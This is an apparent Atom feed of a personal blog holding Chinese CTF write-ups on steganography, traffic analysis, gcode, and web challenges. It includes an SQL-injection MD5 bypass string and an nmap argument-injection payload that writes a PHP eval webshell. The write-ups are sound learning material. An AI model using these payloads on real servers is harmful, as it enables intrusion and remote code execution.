<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://Ro1ing.github.io</id>
    <title>Ro1ing</title>
    <updated>2021-05-20T13:34:45.949Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://Ro1ing.github.io"/>
    <link rel="self" href="https://Ro1ing.github.io/atom.xml"/>
    <subtitle>To be patient.</subtitle>
    <logo>https://Ro1ing.github.io/images/avatar.png</logo>
    <icon>https://Ro1ing.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, Ro1ing</rights>
    <entry>
        <title type="html"><![CDATA[[INSHack2019]gflag]]></title>
        <id>https://Ro1ing.github.io/post/inshack2019gflag/</id>
        <link href="https://Ro1ing.github.io/post/inshack2019gflag/">
        </link>
        <updated>2021-03-16T07:30:38.000Z</updated>
        <content type="html"><![CDATA[<p><strong>My brother likes esoteric programming. He sent me this file but I don't see what it is for. Could you help me ?</strong><br>
我哥哥喜欢深奥的程序设计。他给我发了这份文件，但我不知道是做什么用的。你能帮我个忙吗?<br>
<a href="https://static.ctf.insecurity-insa.fr/a7572eb34ba9700b39f1ba7f5869bf301b67d406.tar.gz">GFlag files</a><br>
<img src="https://Ro1ing.github.io/post-images/1615880103330.png" alt="" loading="lazy"><br>
查到WP<br>
https://cosmikflaghunters.wordpress.com/2019/05/05/inshack-2019-gflag/<br>
G1 lines look like axis positioning, so we started to search printing coding and we found GCODE.<br>
As we don’t have a 3D printer, we have to simulate the printing online, we foud the website <a href="http://gcode.ws/">http://gcode.ws</a><br>
Add .gcode at the end of the file and upload it to the website:<br>
<img src="https://Ro1ing.github.io/post-images/1615880184407.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1615880187535.png" alt="" loading="lazy"><br>
NSA{3d_pr1nt3d_fl49}</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[HDCTF2019]信号分析]]></title>
        <id>https://Ro1ing.github.io/post/hdctf2019xin-hao-fen-xi/</id>
        <link href="https://Ro1ing.github.io/post/hdctf2019xin-hao-fen-xi/">
        </link>
        <updated>2021-03-15T13:01:42.000Z</updated>
        <content type="html"><![CDATA[<p>2秒的音频没有声音</p>
<figure data-type="image" tabindex="1"><img src="https://Ro1ing.github.io/post-images/1615879711654.png" alt="" loading="lazy"></figure>
<p>波形切换到波形（db）就有图像了<br>
单个波形是有规律的<br>
提示：Hackcube</p>
<p><a href="https://www.freebuf.com/author/mobier">使用HackCube-Special分析固定码信号</a></p>
<h3 id="信号脉冲">信号脉冲</h3>
<figure data-type="image" tabindex="2"><img src="https://Ro1ing.github.io/post-images/1615879749906.png" alt="" loading="lazy"></figure>
<h3 id="固定码遥控信号的构成">固定码遥控信号的构成</h3>
<p><img src="https://Ro1ing.github.io/post-images/1615879755476.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1615879759978.png" alt="" loading="lazy"><br>
FFFFFFFF 0001 停止码</p>
<p>看wp要得到FFFFFFFF0001然后{}包起来</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ALCTF]Misc]]></title>
        <id>https://Ro1ing.github.io/post/alctfmisc/</id>
        <link href="https://Ro1ing.github.io/post/alctfmisc/">
        </link>
        <updated>2021-01-30T06:46:30.000Z</updated>
        <content type="html"><![CDATA[<p>校内CTF平台 题目</p>
<h2 id="只会影响我拔剑的速度">只会影响我拔剑的速度</h2>
<p>gif逐帧播放</p>
<h2 id="听我娓娓道来">听我娓娓道来</h2>
<p>属性-详细信息-备注 or 16进制</p>
<p>与佛论禅解密网站：http://www.keyfc.net/bbs/tools/tudoucode.aspx</p>
<h2 id="电线鲨鱼">电线鲨鱼</h2>
<p>wireshark打开流量包</p>
<p><img src="1.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611989239604.png" alt="" loading="lazy"><br>
or 偷鸡 16进制</p>
<p><img src="2.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611989243485.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ASIS 2019]Unicorn shop]]></title>
        <id>https://Ro1ing.github.io/post/asis-2019unicorn-shop/</id>
        <link href="https://Ro1ing.github.io/post/asis-2019unicorn-shop/">
        </link>
        <updated>2021-01-30T06:45:22.000Z</updated>
        <content type="html"><![CDATA[<p><img src="image-20200519215130151.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611989154422.png" alt="" loading="lazy"><br>
发现这里无论输入任何ID和Price都无法购买</p>
<p>当Price 小于10 时 显示Wrong commodity</p>
<p>当Price 大于10 时 显示Only one char（？） allowed！</p>
<p><img src="image-20200519215322998.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611989157234.png" alt="" loading="lazy"><br>
utf8?</p>
<p>https://xz.aliyun.com/t/5402#toc-0</p>
<blockquote>
<h3 id="23-数字显示">2.3 数字显示</h3>
<p>一些国家的数字在显示的时候也可能造成问题，例如孟加拉语的0-9是০ ১ ২ ৩ ৪ ৫ ৬ ৭ ৮ ৯，但是这里的৪ (U+09EA) 实际上是数字4。ASIS CTF 2019 的 <a href="https://xz.aliyun.com/t/(https://github.com/hyperreality/ctf-writeups/tree/master/2019-asis)">Unicorn Shop</a> 也是从Unicode背后的数字角度出发考虑问题。</p>
</blockquote>
<p>在这个网站查找Unicode</p>
<p>https://www.compart.com/en/unicode</p>
<p><img src="image-20200519215746992.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611989163598.png" alt="" loading="lazy"><br>
点开找到大于1337的字符即可</p>
<p>参考链接：</p>
<p>https://www.cnblogs.com/Cl0ud/p/12221360.html</p>
<p>https://shawroot.hatenablog.com/entry/2019/10/29/ASIS_2019-Unicorn_shop</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[BJDCTF 2nd]EasyBaBa]]></title>
        <id>https://Ro1ing.github.io/post/bjdctf-2ndeasybaba/</id>
        <link href="https://Ro1ing.github.io/post/bjdctf-2ndeasybaba/">
        </link>
        <updated>2021-01-30T06:44:31.000Z</updated>
        <content type="html"><![CDATA[<p>感觉 有东西压缩在里面 foremost分离</p>
<p>解压出一个 里面都是出题人.jpg</p>
<p>16进制查看是 视频格式 扫码得到 一点都不Easy😅</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[BJDCTF2020]Easy MD5]]></title>
        <id>https://Ro1ing.github.io/post/bjdctf2020easy-md5/</id>
        <link href="https://Ro1ing.github.io/post/bjdctf2020easy-md5/">
        </link>
        <updated>2021-01-30T06:43:16.000Z</updated>
        <content type="html"><![CDATA[<p>抓包发现 Hint</p>
<blockquote>
<p>select * from 'admin' where password=md5($pass,true)</p>
</blockquote>
<p>直接提交 <strong>ffifdyop</strong></p>
<p><strong>md5()函数</strong>有两个参数</p>
<p><strong>参数一</strong>是要加密的字符串；</p>
<p><strong>参数二</strong>是输出格式：为true时，表示输出原始16字符二进制格式；默认为false，表示输出32字符十六进制数。</p>
<p>所以要通过注入</p>
<p>如何闭合sql语句？找到一个字符串MD5加密后得到的原始二进制格式在SQL中拼接 成 ‘ or’ 的形式绕过</p>
<p>ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c</p>
<p>而这个字符串的前几位是 ‘or' 6</p>
<p>Mysql 刚好又会吧 hex 转成 ascii 解释，</p>
<p>因此拼接之后的形式是</p>
<blockquote>
<p>1select * from 'admin' where password='' or '6xxxxx'</p>
</blockquote>
<p><img src="image-20200519221047710.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611989034103.png" alt="" loading="lazy"><br>
查看源代码</p>
<p><img src="image-20200519221054813.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611989037550.png" alt="" loading="lazy"><br>
?a=s155964671a&amp;b=s1091221200a</p>
<p>md5碰撞：<strong>md5码不同但是表示的数字可能相同</strong>，故有md5碰撞导致可能会有安全问题</p>
<p><img src="image-20200519221132965.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611989042033.png" alt="" loading="lazy"><br>
后来看发现这一步不用这么复杂</p>
<p>数组绕过：</p>
<p>?a[]=1&amp;b[]=2即可</p>
<p>拓展：</p>
<p>’ffifdyop：’129581926211651571912466741651878684928’<br>
ffifdyop：T0Do#’<strong>or’8</strong><br>
129581926211651571912466741651878684928：<strong>’or’6</strong>]!r,b</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[BJDCTF2020]杂项Misc]]></title>
        <id>https://Ro1ing.github.io/post/bjdctf2020za-xiang-misc/</id>
        <link href="https://Ro1ing.github.io/post/bjdctf2020za-xiang-misc/">
        </link>
        <updated>2021-01-30T06:42:12.000Z</updated>
        <content type="html"><![CDATA[<h2 id="认真你就输了">认真你就输了</h2>
<p>xls文件打开乱码 看下文件类型</p>
<p>16进制下发现时 压缩包</p>
<p>每个都看看</p>
<p><img src="%E8%AE%A4%E7%9C%9F%E4%BD%A0%E5%B0%B1%E8%BE%93%E4%BA%86.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988979124.png" alt="" loading="lazy"></p>
<h2 id="一叶障目">一叶障目</h2>
<p><img src="%E4%B8%80%E5%8F%B6%E9%9A%9C%E7%9B%AE.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988982398.png" alt="" loading="lazy"></p>
<pre><code class="language-python">import zlib
import struct
#读文件
file = '1.png'  #注意，1.png图片要和脚本在同一个文件夹下哦~
fr = open(file,'rb').read()
data = bytearray(fr[12:29])
crc32key = eval(str(fr[29:33]).replace('\\x','').replace(&quot;b'&quot;,'0x').replace(&quot;'&quot;,''))
#crc32key = 0xCBD6DF8A #补上0x，copy hex value
#data = bytearray(b'\x49\x48\x44\x52\x00\x00\x01\xF4\x00\x00\x01\xF1\x08\x06\x00\x00\x00')  #hex下copy grep hex
n = 4095 #理论上0xffffffff,但考虑到屏幕实际，0x0fff就差不多了
for w in range(n):#高和宽一起爆破
    width = bytearray(struct.pack('&gt;i', w))#q为8字节，i为4字节，h为2字节
    for h in range(n):
        height = bytearray(struct.pack('&gt;i', h))
        for x in range(4):
            data[x+4] = width[x]
            data[x+8] = height[x]
            #print(data)
        crc32result = zlib.crc32(data)
        if crc32result == crc32key:
            print(width,height)
            #写文件
            newpic = bytearray(fr)
            for x in range(4):
                newpic[x+16] = width[x]
                newpic[x+20] = height[x]
            fw = open(file+'.png','wb')#保存副本
            fw.write(newpic)
            fw.close
</code></pre>
<p>crc修复脚本</p>
<h2 id="藏藏藏">藏藏藏</h2>
<p>binwalk分离 解压出word文档</p>
<p>文档里有个qr码 扫描得到</p>
<h2 id="你猜我是个啥">你猜我是个啥</h2>
<p>查看文件头 png</p>
<p>图片二维码 扫出来不是</p>
<p><img src="%E4%BD%A0%E7%8C%9C%E6%88%91%E6%98%AF%E4%B8%AA%E5%95%A5.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988990340.png" alt="" loading="lazy"><br>
佛了</p>
<h2 id="鸡你太美">鸡你太美</h2>
<p>在副本添加文件头</p>
<p><img src="%E9%B8%A1%E4%BD%A0%E5%A4%AA%E7%BE%8E.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988993121.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[BUUCTF 2018]Online Tool]]></title>
        <id>https://Ro1ing.github.io/post/buuctf-2018online-tool/</id>
        <link href="https://Ro1ing.github.io/post/buuctf-2018online-tool/">
        </link>
        <updated>2021-01-30T06:41:39.000Z</updated>
        <content type="html"><![CDATA[<p>代码审计php</p>
<p><strong>escapeshellarg和escapeshellcmd使用不当导致rce</strong></p>
<p>两个函数配合使用就会导致多个参数的注入。</p>
<blockquote>
<p>escapeshellarg和escapeshellcmd的功能</p>
<p><strong>escapeshellarg</strong></p>
<p>1.确保用户只传递一个参数给命令<br>
2.用户不能指定更多的参数一个<br>
3.用户不能执行不同的命令</p>
<p><strong>escapeshellcmd</strong></p>
<p>1.确保用户只执行一个命令<br>
2.用户可以指定不限数量的参数<br>
3.用户不能执行不同的命令</p>
</blockquote>
<p>关于escapeshellarg和escapeshellcmd使用不当导致rce</p>
<p>在https://paper.seebug.org/164/有详解</p>
<p>我们在这摘取</p>
<blockquote>
<ol>
<li>传入的参数是：172.17.0.2' -v -d a=1</li>
<li>经过escapeshellarg处理后变成了'172.17.0.2''' -v -d a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li>
<li>经过escapeshellcmd处理后变成'172.17.0.2'\'' -v -d a=1'，这是因为escapeshellcmd对\以及最后那个<strong>不配对儿</strong>的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php</li>
<li>最后执行的命令是curl '172.17.0.2'\'' -v -d a=1'，由于中间的\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d     a=1'，即向172.17.0.2\发起请求，POST 数据为a=1'。</li>
</ol>
<p>回到mail中，我们的 payload 最终在执行时变成了'-fa'\''( -OQueueDirectory=/tmp -X/var/www/html/test.php )@a.com'，分割后就是-fa(、-OQueueDirectory=/tmp、-X/var/www/html/test.php、)@a.com'，最终的参数就是这样被注入的。</p>
<p>使用escapeshellcmd / escapeshellarg时不可能执行第二个命令。</p>
<p>但是我们仍然可以将参数传递给第一个命令。</p>
<p>这意味着我们也可以将新选项传递给命令。</p>
<p>利用漏洞的能力取决于目标可执行文件。</p>
</blockquote>
<pre><code class="language-php">&lt;?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5(&quot;glzjin&quot;. $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);
}&gt; 
</code></pre>
<blockquote>
<p>HTTP_X_FORWARDED_FOR获取到的IP地址</p>
<p>REMOTE_ADDR代表着客户端的IP</p>
<p>这两个都为比较常见的服务器获取ip</p>
</blockquote>
<blockquote>
<p>echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host);</p>
</blockquote>
<p>这有个system来执行命令有传参。</p>
<p>本意是要输入ip参数来进行扫描，我们可以利用两个函数的漏洞，来过滤。</p>
<p><strong>-oG</strong>可以实现将命令和结果写到文件</p>
<p>payload可以通过写一个Shell到文件中</p>
<p>由此构造payload：</p>
<blockquote>
<p>'<?php @eval($_POST["hack"]); ?> -oG hack.php '</p>
</blockquote>
<p>转化为：</p>
<blockquote>
<p>''[\''&lt;?php](file://''/ @eval($_POST[&quot;hack&quot;]); ?&gt; -oG hack.php '\'''</p>
</blockquote>
<p>输出为：</p>
<blockquote>
<p>&lt;?php @eval($_POST[hack]); ?&gt; -oG hack.php \</p>
</blockquote>
<p>菜刀连接即可</p>
<p>参考链接：</p>
<p>http://lz2y.top/index.php/2020/03/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-buuctf-2018online-tool/</p>
<p>https://note.redmango.top/Online%20Tool(BUUCTF%202018)/</p>
<p>https://paper.seebug.org/164/</p>
<p>https://blog.csdn.net/qq_26406447/article/details/100711933</p>
<p>https://blog.csdn.net/weixin_44077544/article/details/102835099</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[BUUCTFMisc基础]]></title>
        <id>https://Ro1ing.github.io/post/buuctfmisc-ji-chu/</id>
        <link href="https://Ro1ing.github.io/post/buuctfmisc-ji-chu/">
        </link>
        <updated>2021-01-30T06:38:43.000Z</updated>
        <content type="html"><![CDATA[<h2 id="金三胖"><strong>金三胖</strong></h2>
<p>gif 使用fireworks 或其他 图像浏览软件 逐帧查看</p>
<h2 id="二维码"><strong>二维码</strong></h2>
<p>qr码扫下 没有意义 在十六进制编辑器中发现有文件</p>
<p>使用 binwalk分离 4number.txt 和一个压缩包</p>
<p>压缩包 4位数字爆破 获得</p>
<h2 id="n种方法解决"><strong>N种方法解决</strong></h2>
<p>base64图片 是一个二维码 还原 data:image/jpg base64</p>
<h2 id="大白"><strong>大白</strong></h2>
<p>图片明显修改过 宽高度被篡改</p>
<p>使用TweakPNG</p>
<blockquote>
<p>Warning：</p>
<p>Incorrect crc for IHDR chunk (is 6d7c7135, should be 8e14dfcf)</p>
</blockquote>
<p>使用十六进制编辑器修改</p>
<p>回到图片 发现</p>
<h2 id="基础破解"><strong>基础破解</strong></h2>
<blockquote>
<p>你一个压缩包，你并不能获得什么，因为他是四位数字加密的哈哈哈哈哈哈哈。。。不对==我说了什么了不得的东<br>
西。。</p>
</blockquote>
<p>四位数字 直接爆破 得到base64解密</p>
<h2 id="你竟然赶我走"><strong>你竟然赶我走</strong></h2>
<p>十六进制的最后发现了</p>
<h2 id="lsb"><strong>LSB</strong></h2>
<p>stegsolve解析</p>
<p><img src="LSB.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988768771.png" alt="" loading="lazy"><br>
上面感觉有东西</p>
<p>使用 zsteg 解密一下 无</p>
<p>stegsolve 发现红黄蓝有字</p>
<p><img src="LSB2.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988772613.png" alt="" loading="lazy"><br>
生成图片 扫描获得</p>
<h2 id="乌镇峰会种图"><strong>乌镇峰会种图</strong></h2>
<p>十六进制的最后</p>
<h2 id="ningen"><strong>ningen</strong></h2>
<p>binwalk分离</p>
<p>压缩包爆破四位数字 工具ziperello</p>
<p>获得</p>
<h2 id="rar"><strong>rar</strong></h2>
<p>爆破4位</p>
<h2 id="qr"><strong>qr</strong></h2>
<p>扫码</p>
<h2 id="文件中的秘密"><strong>文件中的秘密</strong></h2>
<p>十六进制的中间 发现</p>
<h2 id="镜子里面的世界"><strong>镜子里面的世界</strong></h2>
<p>用stegsloves 分析</p>
<p><img src="%E9%95%9C%E5%AD%90%E9%87%8C%E9%9D%A2%E7%9A%84%E4%B8%96%E7%95%8C.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988780681.png" alt="" loading="lazy"></p>
<h2 id="小明的保险箱"><strong>小明的保险箱</strong></h2>
<p>binwalk分离 四位密码爆破</p>
<h2 id="爱因斯坦"><strong>爱因斯坦</strong></h2>
<p>binwalk 图片备注中有 压缩包密码</p>
<h2 id="假如给我三天光明"><strong>假如给我三天光明</strong></h2>
<p>解盲文  😦   kmdonowg</p>
<p>听摩斯电码 网上有摩斯电码的音频解析网站 当时是一点一点看的:(</p>
<h2 id="wireshark"><strong>wireshark</strong></h2>
<p>使用wireshark 找到那条http login流量中的数据包</p>
<h2 id="easycap"><strong>easycap</strong></h2>
<p>追踪 TCP流</p>
<h2 id="被嗅探的流量"><strong>被嗅探的流量</strong></h2>
<p>追踪 TCP流 流量包中发现</p>
<h2 id="flag"><strong>FLAG</strong></h2>
<p>stegsloves</p>
<p><img src="FLAG.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988789645.png" alt="" loading="lazy"><br>
文件头是 zip</p>
<p>里面一个二进制文件</p>
<p>使用kali strings</p>
<p><img src="FLAG2.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988793153.png" alt="" loading="lazy"></p>
<h2 id="另一个世界"><strong>另一个世界</strong></h2>
<p>十六进制最后一串二进制 转ascii码 得到 koekj3s</p>
<h2 id="荷兰宽带数据泄露"><strong>荷兰宽带数据泄露</strong></h2>
<p>下载附件得到一个conf.bin文件，路由器信息数据，一般包含账号密码。题目并没有提示flag是什么，猜测是账号或者密码加上格式为最终flag。</p>
<p>用RouterPassView查看后，搜索username或者password，最后发现是用户名</p>
<h2 id="来首歌吧"><strong>来首歌吧</strong></h2>
<p>右耳道摩斯密码</p>
<h2 id="隐藏的钥匙"><strong>隐藏的钥匙</strong></h2>
<p>十六进制内</p>
<h2 id="后门查杀"><strong>后门查杀</strong></h2>
<p>include下发现include.php为webshell文件</p>
<p><img src="%E5%90%8E%E9%97%A8%E6%9F%A5%E6%9D%80.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988801371.png" alt="" loading="lazy"><br>
<img src="%E5%90%8E%E9%97%A8%E6%9F%A5%E6%9D%802.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988804693.png" alt="" loading="lazy"></p>
<h2 id="梅花香自苦寒来"><strong>梅花香自苦寒来</strong></h2>
<h2 id="snake"><strong>snake</strong></h2>
<p>binwalk 分离 将key中字符串解密</p>
<p><img src="snake.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988808332.png" alt="" loading="lazy"><br>
Serpent 有蛇的意思在西方神话是一条巨大的蛇型恶魔</p>
<p>anaconda</p>
<h2 id="神秘龙卷风"><strong>神秘龙卷风</strong></h2>
<p>压缩包 四位数字爆破 Brainfuck和Ook加解密</p>
<p>https://tool.bugku.com/brainfuck/</p>
<h2 id="面具下的-flag"><strong>面具下的 flag</strong></h2>
<p>Brainfuck和Ook加解密</p>
<h2 id="webshell后门"><strong>webshell后门</strong></h2>
<p><img src="webshell%E5%90%8E%E9%97%A8.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988814827.png" alt="" loading="lazy"></p>
<h2 id="被劫持的神秘礼物"><strong>被劫持的神秘礼物</strong></h2>
<p>小明收到了一件很特别的礼物，有奇怪的后缀，奇怪的名字和格式。小明找到了知心姐姐度娘，度娘好像知道这是啥，但是度娘也不知道里面是啥。。。你帮帮小明？找到帐号密码，串在一起，用32位小写MD5哈希一下得到的就是答案。</p>
<p>wireshark http数据</p>
<p><img src="%E8%A2%AB%E5%8A%AB%E6%8C%81%E7%9A%84%E7%A5%9E%E7%A7%98%E7%A4%BC%E7%89%A9.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988818695.png" alt="" loading="lazy"><br>
拼接用户名密码得到adminaadminb</p>
<p>使用md5加密后得到1d240aafe21a86afc11f38a45b541a49</p>
<h2 id="刷新过的图片"><strong>刷新过的图片</strong></h2>
<p>F5隐写</p>
<p><img src="%E5%88%B7%E6%96%B0%E8%BF%87%E7%9A%84%E5%9B%BE%E7%89%87.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988824852.png" alt="" loading="lazy"><br>
kali中 java Extract Misc.jpg</p>
<p>解密出一个伪加密的压缩包</p>
<h2 id="穿越时空的思念"><strong>穿越时空的思念</strong></h2>
<p>摩斯电码</p>
<h2 id="秘密文件"><strong>秘密文件</strong></h2>
<p>binwalk分离文件 爆破密码</p>
<h2 id="我吃三明治"><strong>我吃三明治</strong></h2>
<p>一张图片</p>
<p>使用foremost 解出两张图片</p>
<p>看wp说是 在两张图片连接处 有类似与base32的字符串</p>
<p><img src="%E6%88%91%E5%90%83%E4%B8%89%E6%98%8E%E6%B2%BB.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611988838291.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CTFshow Web入门 信息收集篇]]></title>
        <id>https://Ro1ing.github.io/post/ctfshow-web-ru-men-xin-xi-shou-ji-pian/</id>
        <link href="https://Ro1ing.github.io/post/ctfshow-web-ru-men-xin-xi-shou-ji-pian/">
        </link>
        <updated>2021-01-30T06:37:57.000Z</updated>
        <content type="html"><![CDATA[<p>其实还都是看大周师傅的wp才会做的 😃</p>
<p>https://www.d1a0.cn/2020/09/03/ctfshow-web%E5%85%A5%E9%97%A8%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</p>
<h2 id="web1"><strong>web1</strong></h2>
<p>题目：开发注释未及时删除</p>
<p>解：右键查看源代码</p>
<h2 id="web2"><strong>web2</strong></h2>
<p>题目：js前台拦截</p>
<p>解：禁止Javascript 右键查看源代码 或者 ctrl+u 快捷键</p>
<h2 id="web3"><strong>web3</strong></h2>
<p>题目： 没思路的时候抓个包看看，可能会有意外收获</p>
<p>解题思路： burp抓包，查看响应头，得到flag。</p>
<h2 id="web4"><strong>web4</strong></h2>
<p>访问robots.txt</p>
<p>得到提示</p>
<p>/flagishere.txt</p>
<h2 id="web5"><strong>web5</strong></h2>
<p>题目： phps源码泄露有时候能帮上忙</p>
<p>解题思路： 根据提示，访问index.phps将文件下载下来，打开即可看到flag。</p>
<h2 id="web6"><strong>web6</strong></h2>
<p>题目： 解压源码到当前目录，测试正常，收工</p>
<p>解题思路： 访问www.zip ，下载源代码，查看index.php内容，发现flag在fl000g.txt中，这里注意压缩包里fl000g.txt中的flag不正确，应该访问题目环境中的fl000g.txt</p>
<h2 id="web7"><strong>web7</strong></h2>
<p>题目： 版本控制很重要，但不要部署到生产环境更重要。</p>
<p>解题思路： 根据提示版本控制，想到常用的版本控制工具git，svn，尝试访问.git和.svn，在.git中发现flag。</p>
<h2 id="web8"><strong>web8</strong></h2>
<p>题目： 版本控制很重要，但不要部署到生产环境更重要。</p>
<p>解题思路： 上一题访问.git得到flag，这一题首先想到.svn，果然得到flag。</p>
<h2 id="web9"><strong>web9</strong></h2>
<p>题目： 发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</p>
<p>解题思路： 提示vim异常关闭，想到linux下vi/vim异常关闭是会存留.swp文件，尝试访问index.php.swp，得到flag。</p>
<h2 id="web10"><strong>web10</strong></h2>
<p>题目： cookie 只是一块饼干，不能存放任何隐私数据</p>
<p>解题思路： 查看网页的cookie发现flag。</p>
<h2 id="web11"><strong>web11</strong></h2>
<p>题目： 域名其实也可以隐藏信息，比如ctfshow.com 就隐藏了一条信息</p>
<p>解题思路： 在域名解析查询网站查询，http://dbcha.com/ ，逐个尝试，在Txt中发现flag。</p>
<figure data-type="image" tabindex="1"><img src="%5C1.png" alt="" loading="lazy"></figure>
<h2 id="web12"><strong>web12</strong></h2>
<p>题目： 有时候网站上的公开信息，就是管理员常用密码</p>
<p>解题思路： 访问后台，/admin ，提示登录，猜想用户名为admin，密码应该在网站中，观察到页面底部有“Help Line Number : 372619038”，尝试输入数字，成功登录，得到flag。</p>
<h2 id="web13"><strong>web13</strong></h2>
<p>题目： 技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</p>
<p>解题思路： 在网站中寻找技术文档（查看源代码寻找较为方便）,在底部找到document，点击即可查看到默认用户名，密码，访问http://.chall.ctf.show/system1103/login.php 。输入用户名和密码，即可得到flag。</p>
<h2 id="web14"><strong>web14</strong></h2>
<p>题目： 有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死</p>
<p>解题思路： 根据提示访问editor，出现文本编辑器，点击图片，</p>
<p>可以看到文件目录，/var/www/html/nothinghere 中有一个fl000g.txt，访问 http://6ce4a2ea-ac6a-4c12-84fa-40a347055991.chall.ctf.show/nothinghere/fl000g.txt 得到flag。</p>
<h2 id="web15"><strong>web15</strong></h2>
<p>题目： 公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p>
<p>解题思路： 在网站底部发现一个qq邮箱，访问后台，发现可以有忘记密码选项，点击，密保问题是所在地城市，查找qq所在地为西安，输入，返回修改后的密码，登录即可得到flag。</p>
<h2 id="web16"><strong>web16</strong></h2>
<p>题目： 对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p>
<p>解题思路： 提到探针，就想到雅黑探针，访问/tz.php，点击PHP参数，</p>
<p>点击下图红框中文字</p>
<figure data-type="image" tabindex="2"><img src="2.png" alt="" loading="lazy"></figure>
<p>跳转到网站的phpinfo页面，在页面搜索flag，即可找到flag。</p>
<p>（关于php探针的内容可参考https://blog.csdn.net/weixin_43790779/article/details/108834213</p>
<p>）</p>
<h2 id="web17"><strong>web17</strong></h2>
<p>题目： 透过重重缓存，查找到ctfer.com的真实IP，提交flag{IP地址}</p>
<p>解题思路： <a href="https://icplishi.com/">https://icplishi.com</a> 查询www.ctfer.com 的IP地址，得到IP地址即为flag。</p>
<h2 id="web18"><strong>web18</strong></h2>
<p>题目： 不要着急，休息，休息一会儿，玩101分给你flag</p>
<p>解题思路： 查看网页源代码，发现Flappy_js.js文件，访问可看到</p>
<p>将\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b</p>
<p>进行Unicode解码得到 “你赢了，去幺幺零点皮爱吃皮看看”。访问110.php得到flag。</p>
<h2 id="web19"><strong>web19</strong></h2>
<p>题目： 密钥什么的，就不要放在前端了</p>
<p>解题思路： 查看页面源代码，发现一段注释代码，代码中已经给出了用户名和密码，但是若有表单提交密码就会被加密，所以用hackbar工具，POST提交username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04 ，得到flag。</p>
<h2 id="web20"><strong>web20</strong></h2>
<p>题目：</p>
<p>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</p>
<p>我是asp程序，我用的access数据库</p>
<p>直接查看url路径添加/db/db.mdb</p>
<p>下载之后，txt打开</p>
<p>control+f找flag</p>
<p>这里好像是需要用 sqlmap or 御剑来获取accesss数据库</p>
<h2 id="小结">小结</h2>
<ul>
<li>源代码 前端</li>
<li>js前台拦截</li>
<li>抓包：响应头</li>
<li>robots.txt</li>
